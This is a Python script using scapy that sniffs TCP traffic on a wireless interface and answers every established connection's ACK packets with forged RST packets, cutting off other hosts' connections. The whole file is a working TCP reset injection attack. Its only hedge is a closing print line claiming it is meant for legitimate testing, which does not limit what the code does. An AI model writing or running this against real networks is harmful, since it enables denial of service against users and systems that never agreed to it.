from scapy.all import sniff, send, IP, TCP

# Default network interface and filter
dev = "wlan0"
filter = "tcp"

# Function to handle each captured packet
def handle_packet(packet):
    # Check if the packet is TCP
    if packet.haslayer(TCP):
        tcp_layer = packet[TCP]
        # Check if the packet is not SYN, RST, FIN, and is an ACK
        if ('S' not in tcp_layer.flags) and ('R' not in tcp_layer.flags) \
        and ('F' not in tcp_layer.flags) and ('A' in tcp_layer.flags):
            # Create a RST packet to send
            rst_packet = IP(src=packet[IP].dst, dst=packet[IP].src) / \
                    TCP(sport=tcp_layer.dport, dport=tcp_layer.sport,
                        seq=tcp_layer.ack, ack=tcp_layer.seq + 1,
                        flags="R")
            # Send the RST packet
            send(rst_packet, iface=dev)
            # Print information about the reset connection
            print("RST %s:%d -> %s:%d" % (packet[IP].src,
                                        tcp_layer.sport,
                                        packet[IP].dst,
                                        tcp_layer.dport))


# Start capturing and handling packets
sniff(iface=dev, filter=filter, prn=handle_packet)

print("Remember, this script should only be used for legitimate testing purposes.")
